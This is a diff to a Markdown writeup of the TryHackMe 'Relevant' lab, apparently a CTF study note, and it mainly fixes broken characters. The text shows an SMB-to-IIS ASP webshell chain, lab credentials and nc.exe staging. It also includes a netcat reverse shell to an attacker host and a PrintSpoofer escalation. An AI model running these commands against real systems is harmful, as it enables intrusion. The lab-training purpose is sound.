@@ -1,30 +1,30 @@
-﻿# Relevant Â— TryHackMe Writeup
+﻿# Relevant — TryHackMe Writeup
 
 **Target:** `TARGET_IP`
 **OS:** Windows Server 2016 Standard
 **Difficulty:** Medium
-**Tech stack:** IIS 10.0 (Ã—2 ports Â— `:80` + `:49663`), SMB (writable share), RDP, MSRPC
-**Exploit chain:** SMB guest enum ? `nt4wrksv` (R/W) ? `passwords.txt` base64-decoded creds ? upload `.asp` webshell via SMB ? IIS `:49663` executes it ? stage `nc.exe` ? reverse shell as `iis apppool\defaultapppool` / `Bob`
+**Tech stack:** IIS 10.0 (×2 ports — `:80` + `:49663`), SMB (writable share), RDP, MSRPC
+**Exploit chain:** SMB guest enum  `nt4wrksv` (R/W)  `passwords.txt` base64-decoded creds  upload `.asp` webshell via SMB  IIS `:49663` executes it  stage `nc.exe`  reverse shell as `iis apppool\defaultapppool` / `Bob`
 
 ---
 
 ## Attack Chain Overview
 
 ```
-nmap ? 80, 135, 139, 445, 3389, 49663, 49666, 49667
-        ?
-netexec smb -u guest --shares ? nt4wrksv (READ,WRITE)
-        ?
-smbclient //$TARGET/nt4wrksv -N ? get passwords.txt
-        ?
-base64 -d ? Bob:!P@$$W0rD!123, Bill:Juw4nnaM4n420696969!$$$
-        ?
+nmap  80, 135, 139, 445, 3389, 49663, 49666, 49667
+        
+netexec smb -u guest --shares  nt4wrksv (READ,WRITE)
+        
+smbclient //$TARGET/nt4wrksv -N  get passwords.txt
+        
+base64 -d  Bob:!P@$$W0rD!123, Bill:Juw4nnaM4n420696969!$$$
+        
 smbclient -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
-        ?
+        
 http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami
-        ?
-powershell IWR nc.exe ? C:\Windows\Temp\nc.exe ? reverse shell
-        ?
+        
+powershell IWR nc.exe  C:\Windows\Temp\nc.exe  reverse shell
+        
 user.txt at C:\Users\Bob\Desktop\user.txt
 ```
 
@@ -32,9 +32,9 @@ user.txt at C:\Users\Bob\Desktop\user.txt
 
 ## Table of Contents
 1. [Reconnaissance](#1-reconnaissance)
-2. [SMB Enumeration Â— Writable Share + Encoded Creds](#2-smb-enumeration--writable-share--encoded-creds)
-3. [Initial Access Â— ASP Webshell via SMB ? IIS](#3-initial-access--asp-webshell-via-smb--iis)
-4. [Reverse Shell Â— Stage `nc.exe`](#4-reverse-shell--stage-ncexe)
+2. [SMB Enumeration — Writable Share + Encoded Creds](#2-smb-enumeration--writable-share--encoded-creds)
+3. [Initial Access — ASP Webshell via SMB  IIS](#3-initial-access--asp-webshell-via-smb--iis)
+4. [Reverse Shell — Stage `nc.exe`](#4-reverse-shell--stage-ncexe)
 5. [User Flag](#5-user-flag)
 6. [Key Takeaways](#6-key-takeaways)
 
@@ -55,14 +55,14 @@ nmap -sVC -p80,135,139,445,3389,49663,49666,49667 $TARGET -oN service
 | 135/tcp | MSRPC |
 | 139, 445/tcp | SMB (Server 2016 Standard) |
 | 3389/tcp | RDP |
-| 49663/tcp | **IIS 10.0 Â— second instance** |
+| 49663/tcp | **IIS 10.0 — second instance** |
 | 49666, 49667/tcp | Dynamic RPC |
 
 Two IIS instances. The second one (`:49663`) is what eventually executes the webshell. See [nmap.md](../../../tools/recon/nmap.md).
 
 ---
 
-## 2. SMB Enumeration Â— Writable Share + Encoded Creds
+## 2. SMB Enumeration — Writable Share + Encoded Creds
 
 Full technique: [smb-anonymous-enum.md](../../../playbooks/enumeration/smb-anonymous.md), [base64-encoded-credentials.md](../../../techniques/creds/base64-encoded-credentials.md).
 
@@ -104,7 +104,7 @@ Tools: [netexec](../../../tools/recon/netexec.md), [smbclient](../../../tools/re
 
 ---
 
-## 3. Initial Access Â— ASP Webshell via SMB ? IIS
+## 3. Initial Access — ASP Webshell via SMB  IIS
 
 Full technique: [smb-write-iis-execution.md](../../../exploits/web-rce/smb-write-iis-execution.md).
 
@@ -139,7 +139,7 @@ curl "http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami"
 
 ---
 
-## 4. Reverse Shell Â— Stage `nc.exe`
+## 4. Reverse Shell — Stage `nc.exe`
 
 ```bash
 # Attacker
@@ -169,7 +169,7 @@ curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
   --data-urlencode "cmd=C:\\Windows\\Temp\\nc.exe $LHOST 4444 -e cmd.exe"
 ```
 
-`-G --data-urlencode` is mandatory Â— the spaces, quotes and `\` inside the cmd would otherwise corrupt the URL.
+`-G --data-urlencode` is mandatory — the spaces, quotes and `\` inside the cmd would otherwise corrupt the URL.
 
 Tools: [netcat](../../../tools/pivot/netcat.md), [curl](../../../tools/web/curl.md).
 
@@ -186,7 +186,7 @@ type C:\Users\Bob\Desktop\user.txt
 
 ---
 
-## 6. Privilege Escalation â€” winPEAS and PrintSpoofer
+## 6. Privilege Escalation — winPEAS and PrintSpoofer
 
 Full technique: [printspoofer-seimpersonate.md](../../../privesc/windows/printspoofer-seimpersonate.md).
 
@@ -199,8 +199,8 @@ powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\winPEAS.ps1
 
 winPEAS findings:
 - SNMP Key found at `HKLM:\SYSTEM\CurrentControlSet\Services\SNMP`
-- Unquoted Service Path: `AWSLiteAgent` â†’ `C:\Program Files\Amazon\XenTools\LiteAgent.exe`
-- **SeImpersonatePrivilege enabled** â†’ PrintSpoofer path
+- Unquoted Service Path: `AWSLiteAgent` → `C:\Program Files\Amazon\XenTools\LiteAgent.exe`
+- **SeImpersonatePrivilege enabled** → PrintSpoofer path
 
 ```cmd
 REM What it does: download the PrintSpoofer exploit from the attacker.
@@ -224,17 +224,17 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ## 7. Key Takeaways
 
-- Writable SMB shares mirrored as IIS virtual directories are an instant webshell path â€” `smbclient put shell.asp` + `curl http://target/share/shell.asp` is the universal chain.
+- Writable SMB shares mirrored as IIS virtual directories are an instant webshell path — `smbclient put shell.asp` + `curl http://target/share/shell.asp` is the universal chain.
 - Always check for a second IIS instance on high ports (`:49663`, `:8080`). The share path may only be served by the alternate binding.
 - Base64-encoded credential files in SMB shares are more common than you'd expect. `cat + base64 -d` is a mandatory triage step.
-- `curl -G --data-urlencode` is essential for webshell payloads with special characters â€” URL encoding in the query string prevents corruption.
-- `SeImpersonatePrivilege` on IIS app pool accounts is the default on Windows Server â€” PrintSpoofer/JuicyPotato is almost always the privesc path.
+- `curl -G --data-urlencode` is essential for webshell payloads with special characters — URL encoding in the query string prevents corruption.
+- `SeImpersonatePrivilege` on IIS app pool accounts is the default on Windows Server — PrintSpoofer/JuicyPotato is almost always the privesc path.
 
 ---
 
 ## Related Notes
-- [smb-anonymous-enum.md](../../../playbooks/enumeration/smb-anonymous.md) Â— finding the share
-- [base64-encoded-credentials.md](../../../techniques/creds/base64-encoded-credentials.md) Â— decoding the credential file
-- [smb-write-iis-execution.md](../../../exploits/web-rce/smb-write-iis-execution.md) Â— full ASP/IIS chain
-- [windows-enumeration.md](../../../playbooks/enumeration/windows.md) Â— what to do once you land the shell
+- [smb-anonymous-enum.md](../../../playbooks/enumeration/smb-anonymous.md) — finding the share
+- [base64-encoded-credentials.md](../../../techniques/creds/base64-encoded-credentials.md) — decoding the credential file
+- [smb-write-iis-execution.md](../../../exploits/web-rce/smb-write-iis-execution.md) — full ASP/IIS chain
+- [windows-enumeration.md](../../../playbooks/enumeration/windows.md) — what to do once you land the shell
 - [nmap](../../../tools/recon/nmap.md), [netexec](../../../tools/recon/netexec.md), [smbclient](../../../tools/recon/smbclient.md), [netcat](../../../tools/pivot/netcat.md), [curl](../../../tools/web/curl.md)
